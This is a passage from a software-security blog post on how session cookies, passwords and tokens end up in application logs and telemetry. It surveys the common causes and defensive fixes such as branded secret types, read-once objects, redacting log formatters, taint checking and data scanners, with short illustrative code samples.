href="https://allan.reyes.sh#-kitchen-sinks">Kitchen sinks</a></li><li>&#128295; <a href="https://allan.reyes.sh#-configuration-changes">Configuration changes</a></li><li>&#129383; <a href="https://allan.reyes.sh#-embedded-secrets">Embedded secrets</a></li><li>&#128225; <a href="https://allan.reyes.sh#-telemetry">Telemetry</a></li><li>&#128378;&#127995; <a href="https://allan.reyes.sh#-user-input">User input</a></li></ol><h3>&#129318; Direct logging</h3><div><pre><code><span><span><span>const</span> <span>temp</span> <span>=</span> <span>res</span>.<span>cookie</span>[<span>"session"</span>]; </span></span><span><span><span>// TODO: remove after testing is done </span></span></span><span><span><span>Logger</span>.<span>info</span>(<span>"session HERE"</span>, { <span>temp</span> }); </span></span></code></pre></div><blockquote><p>Narrator: it was <em>not</em> removed after testing was done</p></blockquote><p>The first group is perhaps the most obvious and facepalm one: when sensitive data is directly logged. Sometimes it&rsquo;s purely accidental, like the example above: someone wants to debug session cookies in their local environment and then&hellip; accidentally commits the code. Sometimes it comes from an uninformed position where the developer just doesn&rsquo;t know any better.</p><p>These tend to be fairly easy to trace down the exact line of code or commit that introduces it. With this example, you can just grep the codebase for <code>session here</code> and you&rsquo;ll find it instantly.</p><h3>&#128688; Kitchen sinks</h3><div><pre><code><span><span><span>const</span> <span>client</span> <span>=</span> <span>googleSdk</span>.<span>admin</span>(...); </span></span><span><span><span>try</span> { </span></span><span><span> <span>const</span> <span>res</span> <span>=</span> <span>client</span>.<span>tokens</span>.<span>list</span>(...); </span></span><span><span>} <span>catch</span> (<span>e</span>) { </span></span><span><span> <span>Logger</span>.<span>error</span>(<span>"failed fetch"</span>, { <span>e</span> }); </span></span><span><span>} </span></span></code></pre></div><p>I&rsquo;m sure you&rsquo;ve seen or written code like this before. Here we have an API client or SDK that is used to fetch some data. Exceptions are caught, kind of, and then promptly logged so that on-call engineers can debug the errors.</p><p>What happens?</p><center><img alt="Meme: surprise, error handler!" src="https://allan.reyes.sh/img/ksool/surprise.jpg"></center><p>That error is decorated with a config object stuffed with secrets and the full response object, which is also stuffed with secrets, and now they&rsquo;re both in your logs!</p><div><pre><code><span><span>{ </span></span><span><span> <span>e</span><span>:</span> { </span></span><span><span> <span>status</span>: <span>400</span>, </span></span><span><span> ... </span></span><span><span> <span>config</span><span>:</span> { <span>&#128165;&#9760;&#65039;&#129702;</span> }, </span></span><span><span> <span>response</span><span>:</span> { <span>&#128163;&#128557;&#128561;</span> }, </span></span><span><span> } </span></span><span><span>} </span></span></code></pre></div><p>I call these &ldquo;kitchen sinks,&rdquo; objects that contain or hold secrets, often in opaque or unexpected ways. Think of an actual kitchen sink that&rsquo;s filled to the brim with dirty dishes and you can&rsquo;t easily tell what&rsquo;s at the bottom without reaching into it. Maybe it&rsquo;s a spoon, or maybe <em>it&rsquo;s knife and now you have to go to the hospital</em>. What tends to happen is that the whole kitchen sink gets logged, and the logging library happily serializes it, including parts that were actually sensitive.</p><p>This seems to happen with code that attaches additional data onto errors, or code that logs full request and response objects. It&rsquo;s typically a bit hard to catch in code review unless you know to look for them. If you are blessed with static types, seeing an <code>any</code> type flow into logs can be a good hint that you&rsquo;re logging too much.</p><h3>&#128295; Configuration changes</h3><blockquote><p>Narrator: it was <em>not</em> okay</p></blockquote><p>Next example: someone needs additional observability and changes a setting like the global log level. You know exactly what happens, here. This dev is about to have a bad time and find out that hope, in fact, is not a valid strategy.</p><p>We started with an observability problem. Now we also have security problem: brand new secrets are getting emitted into logs.</p><p>In that example <em>(that totally never happened to me ever)</em>, developers built production around log levels set to <code>WARN</code> and above, but once you flip it to <code>DEBUG</code>, all this new stuff comes out of the woodwork.</p><p>These type of configuration changes tend to involve a system that was built with one set of assumptions, but some kind of modification moves that system from a known state into a unknown state, introducing a new set of problems.</p><p>These often involve low-level or global utilities like logging config, HTTP middleware, or some central piece of infra like a load balancer. They tend to be singletons that are difficult or costly to test, or they crop up only at runtime. On the positive side, it&rsquo;s usually loud and quick to patch, but cleanup can be kinda painful.</p><h3>&#129383; Embedded secrets</h3><div><pre><code><span><span><span>app</span>.<span>get</span>(<span>"/login/:slug"</span>, <span>async</span> (<span>req</span>, <span>res</span>) <span>=&gt;</span> { </span></span><span><span> <span>const</span> <span>magicLink</span> <span>=</span> <span>req</span>.<span>params</span>[<span>"slug"</span>]; </span></span><span><span> <span>await</span> <span>login</span>({ <span>magicLink</span> }); </span></span><span><span>}); </span></span></code></pre></div><p>I completely made up this phrase, but the idea is that secrets are coupled to, embedded into, and <em>baked into</em> more general formats like URLs or remote procedure calls. The central idea is that it&rsquo;s designed into the format and the system, and can&rsquo;t easily be separated.</p><p>Say you have a magic login link handler (see above) where a user can click a link and sign into a web app. There&rsquo;s nothing in that code that logs the link, but if you look at HTTP logs, it&rsquo;s right there in plain view:</p><div><pre><code><span><span>47.29.201.179 - - [17/Jul/2024:13:17:10 +0000] "GET /login/Uj79z1pe01... </span></span></code></pre></div><p>These types of leaks arise from fundamental designs that don&rsquo;t take logging into consideration or incorrectly assume some end-to-end flow. The sensitivity gets lost out of context, and ends up getting logged in another layer, system, or service.</p><h3>&#128225; Telemetry</h3><div><pre><code><span><span><span>try</span>: </span></span><span><span> db_name <span>=</span> os<span>.</span>getenv(<span>"DB_NAME"</span>) </span></span><span><span> db_pass <span>=</span> os<span>.</span>getenv(<span>"DB_PASS"</span>) <span># &#129323; Secret!</span> </span></span><span><span> conn <span>=</span> db<span>.</span>connect(db_name, db_pass) </span></span><span><span> <span>...</span> </span></span><span><span><span>except</span> Error <span>as</span> e: </span></span><span><span> <span># Don't log e! Not today!!11</span> </span></span><span><span> Logger<span>.</span>error(<span>"failed to connect"</span>) </span></span><span><span><span>finally</span>: </span></span><span><span> conn<span>.</span>close() </span></span></code></pre></div><p>Next example: we have some Python code that&rsquo;s connecting to a database, we&rsquo;re specifically NOT logging the error object, and we want to ensure we always close out the connection.</p><p>How can <code>db_pass</code> possibly make it into logs? Telemetry!</p><center><img alt="A screenshot of a Sentry dashboard" src="https://allan.reyes.sh/img/ksool/sentry.jpg"><br><i>"Oops, that's a log, too!"</i></center><p>It turns out that things like error monitoring and analytics can totally be logs, too. I kind of cheated in the code example, because there&rsquo;s no mention of telemetry in it at all, but it turns out that if you hook it up to error monitoring like <a href="https://sentry.io/">Sentry</a> (above), run-time errors send the local variable context right to the dashboard, and you can see the database password in plaintext.</p><p>These causes tend to bypass the central logging pipeline and become Yet Another Place to have to worry about secrets.</p><h3>&#128378;&#127995; User input</h3><p>Alright, last example. Say there&rsquo;s a sign in form and the entire dev team made super duper sure that the password field is totally locked down from logging, they read this super awesome post, and took care of all the causes we discussed.</p><p>What happens?</p><center><img alt="A screenshot of the AWS sign in form" src="https://allan.reyes.sh/img/ksool/aws.jpg"></center><p>Users end up jamming passwords into the username field!</p><p>So if you ever looked at login alerts for AWS and saw usernames replaced with <code>HIDDEN_DUE_TO_SECURITY_REASONS</code>, this is precisely why!</p><p>Everything that&rsquo;s within proximity to sensitive user input tends to be radioactive. It could be a UI issue, but users are surprisingly determined to volunteer secrets in ways that you haven&rsquo;t prepared for.</p><p>We&rsquo;ve touched on a half dozen causes, and the list of things goes on. We didn&rsquo;t even talk about the wonder that is crashdumps. But, I think it&rsquo;s important to zoom out and note that these are proximate causes.</p><center><img alt="A funny tweet about root cause" src="https://allan.reyes.sh/img/root-cause.png"></center><p>I stand by my claim that there&rsquo;s no silver bullet to take these all out. If we want to avoid playing whack-a-mole, we must bring out our lead bullets that address these issues at a deeper level, and prevent these kinds of things from happening.</p><h2>Fixes (lead bullets)</h2><p>So let&rsquo;s dive in! We will survey 10 fixes, and the order we&rsquo;ll go in is somewhere between &ldquo;a dependency graph of things that build on each other&rdquo; and &ldquo;following the lifecycle of a secret.&rdquo; Some of these are obvious or perhaps things you&rsquo;re already doing, so I&rsquo;ll focus more on fixes that I think might be a bit newer. That said, it is worth starting with the basics.</p><ol><li>&#128208; <a href="https://allan.reyes.sh#-data-architecture">Data architecture</a></li><li>&#127838; <a href="https://allan.reyes.sh#-data-transformations">Data transformations</a></li><li>&#129704; <a href="https://allan.reyes.sh#-domain-primitives">Domain primitives</a></li><li>&#127873; <a href="https://allan.reyes.sh#-read-once-objects">Read-once objects</a></li><li>&#128451;&#65039; <a href="https://allan.reyes.sh#-log-formatters">Log formatters</a></li><li>&#129514; <a href="https://allan.reyes.sh#-unit-tests">Unit tests</a></li><li>&#128373;&#65039; <a href="https://allan.reyes.sh#-sensitive-data-scanners">Sensitive data scanners</a></li><li>&#129302; <a href="https://allan.reyes.sh#-log-pre-processors">Log pre-processors</a></li><li>&#128270; <a href="https://allan.reyes.sh#-taint-checking">Taint checking</a></li><li>&#129464; <a href="https://allan.reyes.sh#-people">People</a></li></ol><h3>&#128208; Data architecture</h3><p>Lead bullet #1 is the most basic and high-level: data architecture and understanding that this is primarily a data flow problem. And part of the solution is reducing the number of data flows and shrinking the problem space so you simply have less things to worry about and protect.</p><center><img alt="A simple data architecture flow" src="https://allan.reyes.sh/img/ksool/arch.jpg"></center><p>Instead of stray print statements or components that write directly to filesystem, you instead centralize all your data flows through a single stream. Make it so that there&rsquo;s one and only one way to log something. If you can understand and control the data structures that enter that funnel, you can prohibit secrets from exiting it.</p><p>This has the allure of being a silver bullet, because of course if you can get to 100% of all the things we mentioned here, you&rsquo;re golden! But in practice (and as we&rsquo;ve seen previously), that&rsquo;s difficult because secrets find a way to sneak in or new outflows and side channels are created.</p><h3>&#127838; Data transformations</h3><p>The previous bullet was about controlling how data flows through your system, this is about transforming, slicing, and disarming that data into safer forms that can be logged. These are the data security fundamentals that you&rsquo;re already familiar with and likely already doing. This is your bread and butter, so I&rsquo;m not going to dive into every one. From top to bottom, this is generally arranged from awesome to meh&hellip; basically, by how much information is retained.</p><table><thead><tr><th>Transformation</th><th>Result</th></tr></thead><tbody><tr><td>Minimization</td><td>&#9729; (nothing)</td></tr><tr><td>Redaction</td><td>[redacted]</td></tr><tr><td>Tokenization</td><td>2706a40d-3d1d&hellip;</td></tr><tr><td>Hashing</td><td>daadfab322b59&hellip;</td></tr><tr><td>Encryption</td><td>AzKt7vBE7qEuf&hellip;</td></tr><tr><td>Masking</td><td>&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;<code>5309</code></td></tr></tbody></table><p>On the top, we have data minimization. The best way to not log secrets, is to not have secrets to begin with! This is everything from going passwordless to fetching only the data you need.</p><p>Redaction is the next best thing. Blanking out the secret parts and before you pass objects around in memory.</p><p>Tokenization, hashing, encryption: these all have their pros, cons, and caveats. Like&hellip; are you even doing it correctly?</p><p>Dead last is masking. You leave parts of the secret intact. Maybe this works for you. Maybe it doesn&rsquo;t. Maybe you go straight to jail &#129335;</p><p>When these techniques work, they generally work well. But very often what happens is that they aren&rsquo;t used or are used too late, after something is already logged. These have their places in our toolbox, but my claim again is one bullet isn&rsquo;t enough.</p><h3>&#129704; Domain primitives</h3><p>Let&rsquo;s introduce lead bullet #3: domain primitives. Almost all the secrets you run across in codebases are encoded in-memory as string primitives, and I think that makes our jobs harder. Strings can be almost anything.</p><blockquote><p>Strings: any sequence of bytes from <code>""</code> to <code>"c&#820;&#798;&#785;&#357;&#824;&#840;&#792;&#780; h&#824;&#861; &#813;&#792;&#778;&uuml;&#822;&#796;&#811;&#806;&#800;&#843;&#774;&#864; &#316;&#821;&#814;&#804;&#799;&#777;&#768;&#834;&#7801;&#820;&#797;&#770;&#129335;867-53-0999"</code></p></blockquote><p>There&rsquo;s very little about them&mdash;&mdash;at compile time or run-time&mdash;&mdash;that lets you know that it&rsquo;s sensitive, dangerous to log, or somehow different than any other vanilla string.</p><p>The alternative is a concept I learned from the book <a href="https://www.manning.com/books/secure-by-design">Secure by Design</a>, and I think it&rsquo;s one of the most powerful concepts you can add to your codebase, for logs or anything else where you want to layer in security at a fundamental level.</p><blockquote><p>Domain primitives: &ldquo;combines secure constructs and value objects to define the smallest building block of a <strong>domain</strong>&rdquo;</p></blockquote><div><pre><code><span><span><span>const</span> secret <span>=</span> new Secret(<span>"..."</span>) </span></span></code></pre></div><p>You use them as basic building blocks that hold secret values, and they provide security invariants and guarantees that basic string primitives simply cannot.</p><p>It&rsquo;s one of the easiest things you can do. If you shift from &ldquo;any string can be a secret&rdquo; to &ldquo;secrets are secrets&rdquo;, it makes things a lot easier to reason about and protect.</p><h4>Compile-time</h4><div><p><em>"Check out a previous blog post on <a href="https://allan.reyes.sh/posts/branded-types/">branded types</a>, which are <em>fantastic</em> domain primitives with strong compile-time guardrails."</em></p></div><p>You can use these to great advantage at compile-time, giving developers immediate feedback right in their editors.</p><p>We can type a logging function (<code>log()</code>) so that it <strong>never accepts secrets</strong>. Then, we use some fetching function that returns secrets, typed as secrets (and not as strings). If we try to log that secret, it will not compile. The type system will not let you log this secret.</p><div><pre><code><span><span><span>// Types </span></span></span><span><span><span>declare</span> <span>const</span> <span>brand</span>: <span>unique</span> <span>symbol</span>; </span></span><span><span><span>type</span> <span>Secret</span> <span>=</span> <span>string</span> <span>&amp;</span> { [<span>brand</span>]<span>:</span> <span>string</span> }; <span>// Branded type that extends string </span></span></span><span><span><span>type</span> <span>NotSecret</span>&lt;<span>T</span>&gt; <span>=</span> <span>T</span> <span>extends</span> <span>Secret</span> <span>?</span> <span>never</span> <span>:</span> <span>T</span>; <span>// Type that excludes secrets </span></span></span><span><span><span>// Logging function </span></span></span><span><span><span>function</span> <span>log</span>&lt;<span>T</span> <span>extends</span> <span>string</span>&gt;(<span>message</span>: <span>NotSecret</span>&lt;<span>T</span>&gt;) { ... }; </span></span></code></pre></div><div><pre><code><span><span><span>const</span> <span>message</span>: <span>string</span> <span>=</span> <span>"this is fine"</span>; <span>// &#129525; string primitive </span></span></span><span><span><span>const</span> <span>secretz</span>: <span>Secret</span> <span>=</span> <span>getSecret</span>(); <span>// &#128072; domain primitive </span></span></span><span><span><span>log</span>(<span>message</span>); <span>// &#128076; compiles! </span></span></span><span><span><span>log</span>(<span>secretz</span>); <span>// &#128165; error! </span></span></span></code></pre></div><blockquote><p>See this example in the <a href="https://www.typescriptlang.org/play/?ssl=1&amp;ssc=1&amp;pln=5&amp;pc=80#code/CYUwxgNghgTiAEYD2A7AzgF3gIxlFwAXPAK4oCWAjiQmgJ4C22SEA3AFAZ0AOCAyuDhYAvPEwxyKAObwAZPADe8ANq58wALrFxkmQF9W8APRH4AQXgAiNQRDB4XXg4AWULCAAeGEATRiMEtLsAGZkYBjkqPBQaGggMBgCYEIAFABuUBA02gG6AJTEMXEJfhlZCOR+SUKKesamABIgELww8KEo4ZEo7Jw8CABySImCIBgAPAAqAHzwopPwnt6+8NVj8AD88CggafHwxJOGJvCT-S5uix6QJKB+ccljaL0dXVFSY2sYKQWro1gKdjwYGIVCYeBlGhzKxoJAMWj-dpjMDOOztGBw6Jif73DBIOCWIEgorxEaPb6QkB5Dgg+BCEgwFAQzI0Dh6F5hCJRCBIKRTK7LYC4wJSaYpeGxKAfYhDMlCKbTPKKInA5DoFggAB0PKk4pAko+eXYBl6avBErQUpAORF0MsGGclXgTuCkhAlmOpkAfBuAV93-LbuBIGOQInt2GasA8hAAvYhfaEfOVjH6GEEnQC8G4AJHfgwDhUEk8ED5GDoZAvR1eoNVM98HTgBkd0EMbjkCD6gCE7ArUbG0ep9VrgFKdxYwDEwNtAA">TypeScript Playground</a>.</p></blockquote><p>I&rsquo;m omitting and glossing over a ton of details here, because I don&rsquo;t want you to focus on the implementation or even TypeScript, for that matter. The salient point here is that instead of tossing secret strings around, you brand them as secret types, providing useful context to both compiler and developer.</p><h4>Run-time</h4><p>It&rsquo;s really easy to get started, even with code that is functionally a no-op. This is basically the simplest form I can think of&mdash;an almost empty class:</p><div><pre><code><span><span><span>class</span> <span>OpenAIToken</span> <span>extends</span> String { <span>/* that could be it! */</span> } </span></span><span><span><span>const</span> <span>token</span> <span>=</span> <span>new</span> <span>OpenAIToken</span>(...); </span></span></code></pre></div><p>It&rsquo;s supposed to represent OpenAI credentials, but it&rsquo;s just using and extending basic language primitives. You can introduce these objects where secrets originate, like password fields or anytime you decrypt sensitive data fetched from the database. And then layer in behaviors and invariants for where they tend to end up. You progressively start introducing these at both sources and sinks, allowing you to control where secrets should or shouldn&rsquo;t go. You can embed these into data structures so you know what contains secrets. And along the way, you increase the clarity and safety of your codebase: not only can you prevent these tokens from going into logs, you can make sure you&rsquo;re sending them only to OpenAI and not to some other API by accident.</p><p>I think in the long run, domain primitives are the most powerful control we have because it makes our code <em>secure by design</em>, but it does take some time to get there. These can easily address the direct logging cause we discussed earlier, and with some modifications can help with many more.</p><h4>Run-time: part deux</h4><p>We can extend this and make it so that the default serialization behavior is redaction.</p><div><pre><code><span><span><span>class</span> <span>Secret</span> <span>extends</span> String { </span></span><span><span> <span>toString() {</span> <span>return</span> <span>"[redacted]"</span> } <span>// Override! </span></span></span><span><span>} </span></span></code></pre></div><div><pre><code><span><span><span>const</span> <span>secret</span> <span>=</span> <span>new</span> <span>Secret</span>(<span>"shhh!"</span>); </span></span><span><span><span>console</span>.<span>log</span>(<span>secret</span>); </span></span></code></pre></div><p>If you try to stuff this into logs, into JSON, into kitchen sinks, into error monitoring, <em>wherever</em>, it&rsquo;ll always spit out the word &ldquo;redacted&rdquo;. You have to intentionally reach for the value.</p><p>Let&rsquo;s take it further. We can create a custom class with an explicit <code>unwrap()</code> function:</p><div><pre><code><span><span><span>class</span> <span>Secret</span>&lt;<span>T</span>&gt; { </span></span><span><span> <span>constructor</span>(<span>private</span> <span>readonly</span> <span>value</span>: <span>T</span>) {} </span></span><span><span> <span>toString() {</span> <span>return</span> <span>"[redacted]"</span> } <span>// Override serialization </span></span></span><span><span> <span>unwrap() {</span> <span>return</span> <span>this</span>.<span>value</span> } <span>// Explicit getter function </span></span></span><span><span>} </span></span></code></pre></div><p>There&rsquo;s so many things you can do here, like maybe you want to encrypt or zero it out in memory, because that&rsquo;s in your threat model. You can take this as far as you need to or are comfortable with. We&rsquo;ll take it just one step further.</p><h3>&#127873; Read-once objects</h3><p>There&rsquo;s a bit to unpack here, but these build off domain primitives in a very powerful way.</p><div><pre><code><span><span><span>class</span> <span>Secret</span>&lt;<span>T</span>&gt; { </span></span><span><span> <span>private</span> <span>locked</span> <span>=</span> <span>false</span>; </span></span><span><span> <span>constructor</span>(<span>private</span> <span>readonly</span> <span>value</span>: <span>T</span>) {} </span></span><span><span> <span>toString() {</span> <span>return</span> <span>"[redacted]"</span> } </span></span><span><span> <span>/* @returns the sensitive value (once and only once) */</span> </span></span><span><span> <span>unwrap() {</span> </span></span><span><span> <span>if</span> (<span>this</span>.<span>locked</span>) { <span>throw</span> <span>new</span> Error(<span>"already read"</span>) } </span></span><span><span> <span>this</span>.<span>locked</span> <span>=</span> <span>true</span>; </span></span><span><span> <span>return</span> <span>this</span>.<span>value</span>; </span></span><span><span> } </span></span><span><span>} </span></span></code></pre></div><p>These objects wrap and keep the secret safe, until you actually need it. The code in the <code>unwrap()</code> function is the crux: there&rsquo;s a latch or lock that activates after the secret is retrieved the first time. It goes into a &ldquo;locked&rdquo; state, and any following reads result in an error that fails loudly.</p><div><pre><code><span><span><span>const</span> <span>secret</span> <span>=</span> <span>getSecret</span>(); </span></span><span><span><span>const</span> <span>res</span> <span>=</span> <span>await</span> <span>authenticate</span>(<span>secret</span>.<span>unwrap</span>()); <span>// Proper usage </span></span></span><span><span><span>Logger</span>.<span>info</span>(<span>secret</span>); <span>// [redacted] </span></span></span><span><span><span>Logger</span>.<span>info</span>(<span>secret</span>.<span>unwrap</span>()); <span>// &#128165; Error! </span></span></span></code></pre></div><p>Once you get a secret <em>(from user input, database, decryption, etc.)</em> you wrap it in a read-once object immediately and keep it wrapped for as long as you can. And for its single, intended purpose, like using it for some kind of API authentication, you unwrap the value, use it, and then the object stays locked for good. This is surprisingly effective at preventing and detecting unintentional use. It addresses and disarms many of the proximate causes that we discussed earlier.</p><p>This object pairs extremely well with static analysis. Tools like CodeQL or Semgrep can help ensure that developers aren&rsquo;t bypassing any safety guarantees.</p><p>These are generally high signal, especially when you have good unit test coverage. One drawback is that read-once objects, if handled incorrectly but not necessarily unsafely, could cause errors at run-time. But I think the tradeoffs are usually worth it, especially if you complement it with testing, static analysis, and taint-checking. <em>Speaking of which&hellip;</em></p><h3>&#128270; Taint checking</h3><p>I like to think of taint checking as static analysis with superpowers. I absolutely love it and the first time I used it, it was like someone just handed me a lightsaber. Quick review for the uninitiated: the general idea here is that you add taint to various sources (like database objects), and yell loudly if the data flows into certain sinks (like logs).</p><center><img alt="A simple taint flow diagram" src="https://allan.reyes.sh/img/ksool/simple-taint.jpg"></center><p>The red data flow trace on the right detects the secret flowing into logs. But the green path is fine, because the secret is tokenized. Let&rsquo;s walk through a quick example: <a href="https://semgrep.dev/playground/s/4bq5L">semgrep.dev/playground/s/4bq5L</a></p><p>On the left, we&rsquo;ve marked a couple sources like decrypt and a database fetcher. We&rsquo;ve also marked our logger as a sink, and the <code>tokenize()</code> function as a sanitizer.</p><ul><li>On the right in red, we can see that taint was created from the decrypt function, propagated through the <code>getSSN()</code> function, and then flagged for going into the logs on line 18.</li><li>In blue, there&rsquo;s a much shorter path where the user model from the database is tainted and then flagged for going into logs.</li><li>And then lastly, in green, we&rsquo;re tokenizing the decrypted SSN, so it&rsquo;s not flagging that it&rsquo;s logged.</li></ul><p>The idea that this is checking <em>millions</em> or more different data flows is the real magic part for me.</p><h4>Awesome</h4><p>Some of the strengths of taint analysis: obviously automation. Tracing these data flows is 100% a job for a machine. This can really help with domain primitives but also can be used standalone and can even key in on heuristics like variable names: for example, all variables containing &ldquo;password&rdquo;. You can tie this into all of your critical tools, from code review to CI/CD.</p><p>This is especially potent against kitchen sinks and embedded secrets, because those data structures can be tainted by secret values and checked accordingly.</p><h4>Not awesome</h4><p>Some personal opinions on drawbacks: I do feel like taint checking rules tend to be a bit difficult to write. I really, really like Semgrep, but I&rsquo;m also not the biggest fan of YAML.</p><p>It also turns out that data flow analysis is an NP-hard problem so for large codebases and monorepos, you likely can&rsquo;t run full taint analysis on every pull request or commit. Because it runs in CI/CD and as part of change management, when it works, it can prevent the introduction of insecure logging into the codebase.</p><p>But, like all of the lead bullets we&rsquo;ve discussed and will discuss, they can miss. How can we handle that?</p><h3>&#128451;&#65039; Log formatters</h3><p>Let&rsquo;s say we made the mistake of logging too much data with our email service:</p><div><pre><code><span><span>{ </span></span><span><span> <span>tenantId</span><span>:</span> <span>"52902156-7fb6-4ab0-b659-6b07b80cf89a"</span>, </span></span><span><span> <span>email</span><span>:</span> { </span></span><span><span> <span>subject</span><span>:</span> <span>"Log in to your account"</span>, </span></span><span><span> <span>html</span><span>:</span> <span>'<a href="https://acme.com/login/98fPm...">Click here</a> to log in!'</span>, </span></span><span><span> <span>from</span><span>:</span> <span>"AcmeCorp &lt;<a href="https://allan.reyes.sh/cdn-cgi/l/email-protection">[email&nbsp;protected]</a>&gt;"</span>, </span></span><span><span> <span>to</span><span>:</span> <span>"Darth Plagueis (The Wise) &lt;<a href="https://allan.reyes.sh/cdn-cgi/l/email-protection">[email&nbsp;protected]</a>&gt;"</span>, </span></span><span><span> ... </span></span><span><span> }, </span></span><span><span> <span>response</span><span>:</span> { </span></span><span><span> <span>status</span>: <span>200</span>, </span></span><span><span> <span>originalRequest</span><span>:</span> { </span></span><span><span> <span>headers</span><span>:</span> { </span></span><span><span> <span>Authorization</span><span>:</span> <span>"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIi..."</span> </span></span><span><span> }, </span></span><span><span> <span>body</span><span>:</span> <span>'{"html": "<a href='\\"https://acme.com/login/98fP...\\"'>Click..."}'</a></span>, </span></span><span><span> ... </span></span><span><span> } </span></span><span><span> .... </span></span><span><span> }, </span></span><span><span> ... </span></span><span><span>} </span></span></code></pre></div><p>We have a couple of our usual suspects here. Because we&rsquo;re logging email contents, magic links show up in logs&hellip; twice! We&rsquo;re also logging some kitchen sinks, like email metadata and the original request, so we have PII and authorization headers also in logs. But because this data is structured, if we can traverse these objects, it turns out that we can zero in on these leaks quite effectively.</p><div><pre><code><span><span>{ </span></span><span><span> <span>tenantId</span><span>:</span> <span>"52902156-7fb6-4ab0-b659-6b07b80cf89a"</span>, </span></span><span><span> <span>email</span><span>:</span> { </span></span><span><span> <span>subject</span><span>:</span> <span>"Log in to your account"</span>, </span></span><span><span> <span>html</span><span>:</span> <span>'<a href="https://acme.com/login/REDACTED">Click here</a> to log in!'</span>, </span></span><span><span> <span>from</span><span>:</span> <span>"AcmeCorp &lt;<a href="https://allan.reyes.sh/cdn-cgi/l/email-protection">[email&nbsp;protected]</a>&gt;"</span>, </span></span><span><span> <span>to</span><span>:</span> <span>"REDACTED"</span>, </span></span><span><span> ... </span></span><span><span> }, </span></span><span><span> <span>response</span><span>:</span> { </span></span><span><span> <span>status</span>: <span>200</span>, </span></span><span><span> <span>originalRequest</span><span>:</span> { </span></span><span><span> <span>headers</span><span>:</span> <span>"REDACTED"</span>, </span></span><span><span> <span>body</span><span>:</span> <span>'{"html": "<a href='\\"https://acme.com/login/REDACTED\\"'>..."}'</a></span>, </span></span><span><span> ... </span></span><span><span> } </span></span><span><span> .... </span></span><span><span> }, </span></span><span><span> ... </span></span><span><span>} </span></span></code></pre></div><p>If we can introspect these objects, we can scan for dangerous substrings like our login links, and then drop or redact them. Or we can drop whole values, if we know that certain paths like <code>email.to</code> are particularly dangerous. Fields like <code>request</code> or <code>headers</code> tend to be risky objects that we can also remove. We can even drop the whole log object if it doesn&rsquo;t meet some admission criteria, or&mdash;we can simply error out.</p><p>So, how and where do we deploy something like this? Most application loggers should have some type of middleware stack or pipeline, kinda like here on the right. These are typically configured for operations like converting objects into JSON, turning error objects into readable formats, or enriching logs by inserting useful context like network information. We can invert that, and instead of enriching with useful data, we can remove or redact sensitive data.</p><div><pre><code><span><span><span>export</span> <span>const</span> <span>logger</span> <span>=</span> <span>createLogger</span>({ </span></span><span><span> <span>format</span>: <span>format.combine</span>( </span></span><span><span> <span>transform</span>(), </span></span><span><span> <span>handleErrors</span>(), </span></span><span><span> <span>enrich</span>(), </span></span><span><span> <span>redact</span>(), <span>// &#128072; insert here! </span></span></span><span><span> <span>truncate</span>(), </span></span><span><span> <span>jsonify</span>(), </span></span><span><span> ... </span></span><span><span> ), </span></span><span><span> ... </span></span><span><span>}); </span></span></code></pre></div><p>This is a type of guardrail that helps catch many of the common problems we described previously, like request headers or config objects. I&rsquo;ve used this with decent success and found that it works best as a rifle instead of a shotgun. Because it&rsquo;s at the application tier, you can customize it for the type of data or context that each application handles. For example, we can make it so that any of our domain primitives that reach this layer are quickly detected and removed.</p><p>This is extremely cheap to introduce, but there are some trade-offs. It&rsquo;s certainly more of a safety net than hard control, and a developer determined to bypass it, can and will. Steady state, I measured this at less than 1% of clock time, but there are some deeply unfortunate ways this can go wrong such as poorly written regexes and self-ReDoS.</p><p>More or less, these risks can be mitigated with solid unit-testing. Which leads us to&hellip;</p><h3>&#129514; Unit tests</h3><p>Lead bullet #7: hooking into and using the existing test suite&mdash;that&rsquo;s already there&mdash;to our advantage. We can use several of the tools we discussed, but instead of simply detecting or redacting secrets, we can ramp up the sensitivity in our test environment to fail or error loudly.</p><table><thead><tr><th>Technique</th><th>Prod</th><th>Test</th></tr></thead><tbody><tr><td>&#129704; Domain primitives</td><td>Redact</td><td>Error</td></tr><tr><td>&#127873; Read-once objects</td><td>Error</td><td>Error</td></tr><tr><td>&#128451;&#65039; Log formatters</td><td>Redact</td><td>Error</td></tr><tr><td>&#128373;&#65039; Sensitive data scanners</td><td>Detect</td><td>Error</td></tr></tbody></table><p>I&rsquo;ll cover sensitive data scanners next, but many test suites are already set up to capture <code>stdout</code> and <code>stderr</code>, and so you can even point your scanners to these capture buffers.</p><p>The takeaway here is that you can reap the same benefits of CI/CD and change management by catching unsafe code before it&rsquo;s merged or deployed, but of course, you&rsquo;re also dependent on coverage and if the right code and data paths are exercised.</p><h3>&#128373;&#65039; Sensitive data scanners</h3><p>These are fairly blunt but effective tools that can discover and remove sensitive data. I&rsquo;m actively going to avoid diving deep here, because it does seem like many teams and vendors focus on this as the solution. So instead, I&rsquo;d like to pose a few questions that might help you reason about trade-offs:</p><ul><li>Where and when in your logging pipeline is it most effective?</li><li>Is it a gate, in-line of the critical path, or does it scan asynchronously?</li><li>Do you simply want to detect or do you bias towards masking and redaction? How will your team handle and deal with false positives?</li><li>How far do the general, out-of-box rules take you? Can you tailor it specifically to your usage patterns?</li><li>Can you verify the credentials? Can that even keep up with log throughput?</li><li>And then perhaps what tends to be the long pole in the tent: what are the costs, and can you sample instead?</li></ul><p>I think these tools tend to be better suited for defense-in-depth, because they presume that secrets made it into logs to begin with. They can help catch the more elusive causes we discussed like configuration changes or user input.</p><h4>Sampling</h4><p>A very brief segue into sampling. Logs tend to have a kind of power law distribution, where certain types of logs vastly outnumber others. And typically what you see is that log sources have static points in code, generally with the same type of data running through them. And so within each log type, scanning and finding a single true positive might be highly representative of that group.</p><p>And so you might run into a scenario where, given some global sample rate, you&rsquo;re wasting a lot of work for high frequency logs and not even scanning lower frequency logs. I think a better alternative to a global sample rate is to aggregate logs by some heuristic like type or origin, and to ensure you hit some minimum threshold.</p><center><img alt="A chart depicting sampling" src="https://allan.reyes.sh/img/ksool/sampling.jpg"></center><p>In practice, I&rsquo;ve found this difficult or impossible to configure with out-of-box solutions. I&rsquo;ve had to introduce additional infrastructure to help. And that&rsquo;s our next lead bullet.</p><h3>&#129302; Log pre-processors</h3><p>Second to last lead bullet, #9: log pre-processors. These sit between apps that emit logs, and the final data stores.</p><center><img alt="A simple architecture diagram" src="https://allan.reyes.sh/img/ksool/preprocessing.jpg"></center><p>In the above example, something like <a 